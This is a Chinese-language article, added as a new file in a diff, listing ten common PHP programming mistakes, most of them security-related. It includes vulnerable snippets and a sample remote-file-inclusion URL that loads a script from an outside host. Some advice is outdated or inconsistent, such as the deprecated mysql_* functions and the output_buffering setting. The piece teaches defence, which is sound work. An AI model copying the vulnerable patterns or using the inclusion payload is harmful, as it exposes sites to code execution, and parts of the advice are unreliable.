@@ -1,0 +1,147 @@
+PHP是个伟大的web开发语言，灵活的语言，但是看到php程序员周而复始的犯的一些错误。我做了下面这个列表，列出了PHP程序员经常犯的10中错误，大多数和安全相关。看看你犯了几种
+
+1.不转意html entities
+
+  一个基本的常识：所有不可信任的输入（特别是用户从form中提交的数据），输出之前都要转意。
+
+echo $_GET[''usename''] ;
+
+
+这个例子有可能输出：
+
+<scrīpt></scrīpt>
+
+这是一个明显的安全隐患，除非你保证你的用户都正确的输入。
+
+如何修复 ：
+
+我们需要将"< ",">","and"等转换成正确的HTML表示(< , >'', and")，函数htmlspecialchars 和 htmlentities()正是干这个活的。
+
+正确的方法：
+
+echo htmlspecialchars($_GET[''username''], ENT_QUOTES);
+
+ 
+
+
+2. 不转意SQL输入
+我曾经在一篇文章中最简单的防止sql注入的方法(php+mysql中)讨论过这个问题并给出了一个简单的方法。有人对我说，他们已经在php.ini中将magic_quotes设置为On，所以不必担心这个问题，但是不是所有的输入都是从$_GET,$_POST或 $_COOKIE中的得到的！
+如何修复：
+
+和在最简单的防止sql注入的方法(php+mysql中)中一样我还是推荐使用mysql_real_escape_string()函数
+
+
+正确做法：
+<?php
+$sql = "UPDATE users SET
+name=''.mysql_real_escape_string($name).''
+WHERE id=''.mysql_real_escape_string ($id).''";
+mysql_query($sql);
+?>
+
+ 
+
+ 
+
+
+3.错误的使用HTTP-header 相关的函数: header(), session_start(),setcookie()
+遇到过这个警告吗?"warning: Cannot add header information - headers alreadysent [....]
+
+每次从服务器下载一个网页的时候，服务器的输出都分成两个部分：头部和正文。
+头部包含了一些非可视的数据，例如cookie。头部总是先到达。正文部分包括可视的html，图片等数据。
+如果output_buffering设置为Off，所有的HTTP-header相关的函数必须在有输出之前调用。问题在于你在一个环境中开发，而在部署到另一个环境中去的时候，output_buffering的设置可能不一样。结果转向停止了，cookie和session都没有正确的设置........。
+
+如何修复:
+确保在输出之前调用http-header相关的函数，并且令output_buffering = Off
+。
+
+ 
+
+4. Require 或 include 的文件使用不安全的数据
+再次强调：不要相信不是你自己显式声明的数据。不要 Include 或 require 从$_GET, $_POST 或$_COOKIE 中得到的文件。
+
+
+例如:
+index.php
+<?
+//including header, config, database connection, etc
+include($_GET[''filename'']);
+//including footer
+?>
+
+
+现在任一个黑客现在都可以用:http://www.yourdomain.com/index.php?filename=anyfile.txt
+来获取你的机密信息，或执行一个PHP脚本。
+
+
+如果allow_url_fopen=On，你更是死定了：
+试试这个输入：
+http://www.yourdomain.com/index.php?filename=http%3A%2F%2Fdomain.com%2Fphphack.php
+
+现在你的网页中包含了http://www.youaredoomed.com/phphack.php的输出.黑客可以发送垃圾邮件，改变密码，删除文件等等。只要你能想得到。
+
+
+如何修复：
+你必须自己控制哪些文件可以包含在的include或require指令中。
+
+下面是一个快速但不全面的解决方法：
+<?
+//Include only files that are allowed.
+$allowedFiles =array(''file1.txt'',''file2.txt'',''file3.txt'');
+if(in_array((string)$_GET[''filename''],$allowedFiles)) {
+include($_GET[''filename'']);
+}
+else{
+exit(''not allowed'');
+}
+?>
+
+ 
+
+5. 语法错误
+语法错误包括所有的词法和语法错误，太常见了，以至于我不得不在这里列出。解决办法就是认真学习PHP的语法，仔细一点不要漏掉一个括号，大括号，分号，引号。还有就是换个好的编辑器，就不要用记事本了！
+
+ 
+
+
+6.很少使用或不用面向对象
+很多的项目都没有使用PHP的面向对象技术，结果就是代码的维护变得非常耗时耗力。PHP支持的面向对象技术越来越多，越来越好，我们没有理由不使用面向对象。
+
+ 
+
+
+7. 不使用framework
+95% 的PHP项目都在做同样的四件事: Create, edit, list 和delete.现在有很多MVC的框架来帮我们完成这四件事，我们为何不使用他们呢？
+
+ 
+
+ 
+
+
+8. 不知道PHP中已经有的功能
+PHP的核心包含很多功能。很多程序员重复的发明轮子。浪费了大量时间。编码之前搜索一下PHPmamual，在google上检索一下，也许会有新的发现！PHP中的exec()是一个强大的函数，可以执行cmdshell，并把执行结果的最后一行以字符串的形式返回。考虑到安全可以使用EscapeShellCmd()
+
+ 
+
+9.使用旧版本的PHP
+
+很多程序员还在使用PHP4，在PHP4上开发不能充分发挥PHP的潜能，还存在一些安全的隐患。转到PHP5上来吧，并不费很多功夫。大部分PHP4程序只要改动很少的语句甚至无需改动就可以迁移到PHP5上来。根据http://www.nexen.net的调查只有12%的PHP服务器使用PHP5，所以有88%的PHP开发者还在使用PHP4.
+
+ 
+
+10.对引号做两次转意
+
+见过网页中出现\''或\''"吗？这通常是因为在开发者的环境中magic_quotes设置为off，而在部署的服务器上magic_quotes =on. PHP会在 GET, POST 和COOKIE中的数据上重复运行addslashes() 。
+原始文本：
+It''s a string
+
+magic quotes on :
+It\''s a string
+又运行一次
+addslashes():
+It\\''s a string
+
+HTML输出:
+It\''s a string
+
+还有一种情况就是，用户一开始输入了错误的登录信息，服务器检测到错误输入后，输出同样的form要求用户再次输入，导致用户的输入转意两次。
